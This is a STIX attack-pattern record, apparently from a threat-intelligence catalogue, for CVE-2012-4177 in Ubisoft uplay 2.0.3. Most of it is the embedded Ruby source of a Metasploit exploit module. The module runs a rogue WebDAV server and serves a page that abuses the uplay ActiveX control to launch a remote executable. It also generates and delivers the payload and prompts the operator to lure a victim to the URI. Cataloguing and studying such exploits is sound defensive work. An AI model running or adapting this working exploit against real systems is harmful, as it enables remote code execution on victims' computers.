{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0408f287-5ba8-4320-89d7-c9305ce34615",
    "created": "2024-08-14T16:40:56.219676Z",
    "modified": "2024-08-14T16:40:56.21968Z",
    "name": "Ubisoft uplay 2.0.3 ActiveX Control Arbitrary Code Execution",
    "description": " The uplay ActiveX component allows an attacker to execute any command line action. User must sign in, unless auto-sign in is enabled and uplay must not already be running.  Due to the way the malicious executable is served (WebDAV), the module must be run on port 80, so please make sure you have enough privilege to do that. Ubisoft released patch 2.04 as of Mon 20th July.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ubisoft_uplay_cmd_exec.rb",
            "external_id": "ubisoft_uplay_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4177"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2012/Jul/375"
        },
        {
            "source_name": "reference",
            "url": "http://forums.ubi.com/showthread.php/699940-Uplay-PC-Patch-2-0-4-Security-fix"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ubisoft uplay 2.0.3 ActiveX Control Arbitrary Code Execution',\n      'Description'    => %q{\n        The uplay ActiveX component allows an attacker to execute any command line action.\n        User must sign in, unless auto-sign in is enabled and uplay must not already be\n        running.  Due to the way the malicious executable is served (WebDAV), the module\n        must be run on port 80, so please make sure you have enough privilege to do that.\n        Ubisoft released patch 2.04 as of Mon 20th July.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tavis Ormandy <taviso[at]cmpxchg8b.com>', # Initial discovery\n          'Ben Campbell',\n          'phillips321 <phillips321[at]phillips321.co.uk>',\n          'Richard Hicks <scriptmonkeyblog[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4177' ],\n          [ 'OSVDB', '84402'],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2012/Jul/375'],\n          [ 'URL', 'http://forums.ubi.com/showthread.php/699940-Uplay-PC-Patch-2-0-4-Security-fix' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-07-29'))\n\n    register_options(\n    [\n      OptPort.new('SRVPORT', [true, \"The daemon port to listen on (do not change)\", 80]),\n      OptString.new('URIPATH', [true, \"The URI to use (do not change).\", \"/\"]),\n      OptString.new('EXPLOITPATH', [false, \"The URI to use for the exploit\"])\n    ])\n\n    # WebDAV does not support SSL and must run over port 80.\n    deregister_options('SSL', 'SSLVersion', 'SSLCert', 'SRVPORT' 'URIPATH')\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def is_exploitable?(req)\n    # Only engage Win XP SP3 targets\n    req.headers['User-Agent'] =~ /NT 5\\.1/\n  end\n\n  def on_request_uri(cli, request)\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      if request.uri_parts['Resource'].include? @uplay_uri\n        if is_exploitable?(request)\n          prompt_uplay(cli, request)\n        else\n          print_error(\"Not the target we want, will not engage.\")\n          resp = create_response(404, \"Not Found\")\n          resp.body = \"\"\n          resp['Content-Type'] = 'text/html'\n          cli.send_response(resp)\n        end\n      else\n        process_get(cli, request)\n      end\n    else\n      vprint_status(\"#{request.method} => 404 (#{request.uri})\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n    end\n  end\n\n  def prompt_uplay(cli, request)\n    url =  \"http://\"\n    url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/\"\n\n    path = \"#{@exploit_unc}#{@share_name}\\\\#{@basename}.exe\"\n\n    if path.length > 693\n      fail_with(Failure::Unknown,\"Remote path is too long must be < 694 characters\")\n      return\n    end\n\n    cmd = Rex::Text.encode_base64(path)\n\n    classid = \"clsid:1c492e6a-2803-5ed7-83e1-1b1d4d41eb39\"\n    type = \"application/x-uplaypc\" # Unused but alternative to classid\n    content = %Q|<html>\n<body>\n<script>\nx = document.createElement('OBJECT');\nx.classid='#{classid}';\ndocument.body.appendChild(x);\nx.open('-orbit_product_id 1 -orbit_exe_path #{cmd} -uplay_steam_mode -uplay_dev_mode -uplay_dev_mode_auto_play');\n</script>\n</body>\n</html>|\n\n    print_status(\"GET => Exploit\")\n    send_response_html(cli, content)\n    handler(cli)\n  end\n\n  def process_get(cli, request)\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    webdav = \"\\\\\\\\#{myhost}\\\\\"\n\n    if blacklisted_path?(request.uri)\n      vprint_status(\"GET => 404 [BLACKLIST] (#{request.uri})\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      cli.send_response(resp)\n      return\n    end\n\n    if (request.uri.include? @basename)\n      print_status(\"GET => Payload\")\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    # Treat index.html specially\n    if (request.uri[-1,1] == \"/\" or request.uri =~ /index\\.html?$/i)\n      vprint_status(\"GET => REDIRECT (#{request.uri})\")\n      resp = create_response(200, \"OK\")\n\n      resp.body = %Q|<html><head><meta http-equiv=\"refresh\" content=\"0;URL=#{@exploit_unc}#{@share_name}\\\\\"></head><body></body></html>|\n\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n      return\n    end\n\n    # Anything else is probably a request for a data file...\n    vprint_status(\"GET => DATA (#{request.uri})\")\n    data = \"HELLO!\"\n    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    vprint_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    vprint_status(\"PROPFIND #{path}\")\n    body = ''\n\n    my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    my_uri    = \"http://#{my_host}/\"\n\n    if path !~ /\\/$/\n\n      if blacklisted_path?(path)\n        vprint_status \"PROPFIND => 404 (#{path})\"\n        resp = create_response(404, \"Not Found\")\n        resp.body = \"\"\n        cli.send_response(resp)\n        return\n      end\n\n      if path.index(\".\")\n        vprint_status \"PROPFIND => 207 File (#{path})\"\n        body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n        # send the response\n        resp = create_response(207, \"Multi-Status\")\n        resp.body = body\n        resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n        cli.send_response(resp)\n        return\n      else\n        vprint_status \"PROPFIND => 301 (#{path})\"\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    vprint_status \"PROPFIND => 207 Directory (#{path})\"\n    body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n  <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}</D:href>\n    <D:propstat>\n      <D:prop>\n        <lp1:resourcetype><D:collection/></lp1:resourcetype>\n        <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n        <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n        <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n        <D:supportedlock>\n          <D:lockentry>\n            <D:lockscope><D:exclusive/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n          <D:lockentry>\n            <D:lockscope><D:shared/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n        </D:supportedlock>\n        <D:lockdiscovery/>\n        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n      </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n  </D:propstat>\n</D:response>\n|\n\n    if request[\"Depth\"].to_i > 0\n      trail = path.split(\"/\")\n      trail.shift\n      case trail.length\n      when 0\n        body << generate_shares(path)\n      when 1\n        body << generate_files(path)\n      end\n    else\n      vprint_status \"PROPFIND => 207 Top-Level Directory\"\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def generate_shares(path)\n    share_name = @share_name\n%Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{share_name}/</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n  end\n\n  def generate_files(path)\n    trail = path.split(\"/\")\n    return \"\" if trail.length < 2\n\n    base  = @basename\n    exts  = @extensions.gsub(\",\", \" \").split(/\\s+/)\n    files = \"\"\n    exts.each do |ext|\n      files << %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{base}.#{ext}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n<D:ishidden b:dt=\"boolean\">1</D:ishidden>\n</D:propstat>\n</D:response>\n|\n    end\n\n    files\n  end\n\n  def gen_timestamp(ttype=nil)\n    ::Time.now.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n  end\n\n  def gen_datestamp(ttype=nil)\n    ::Time.now.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n  end\n\n  # This method rejects requests that are known to break exploitation\n  def blacklisted_path?(uri)\n    share_path = \"/#{@share_name}\"\n    payload_path = \"#{share_path}/#{@basename}.exe\"\n    case uri\n    when payload_path\n      return false\n    when share_path\n      return false\n    else\n      return true\n    end\n  end\n\n  def exploit\n    @basename = rand_text_alpha(8)\n    @share_name = rand_text_alpha(8)\n    @extensions = \"exe\"\n\n    if datastore['EXPLOITPATH']\n      @uplay_uri = datastore['EXPLOITPATH']\n    else\n      @uplay_uri = rand_text_alpha(8)\n    end\n\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']\n\n    @exploit_unc  = \"\\\\\\\\#{myhost}\\\\\"\n\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    vprint_status(\"Payload available at #{@exploit_unc}#{@share_name}\\\\#{@basename}.exe\")\n    print_good(\"Please let your victim browse to this exploit URI: http://#{myhost}:#{datastore['SRVPORT']}/#{@uplay_uri}\")\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-29",
    "x_mitre_platforms": [
        "win'"
    ]
}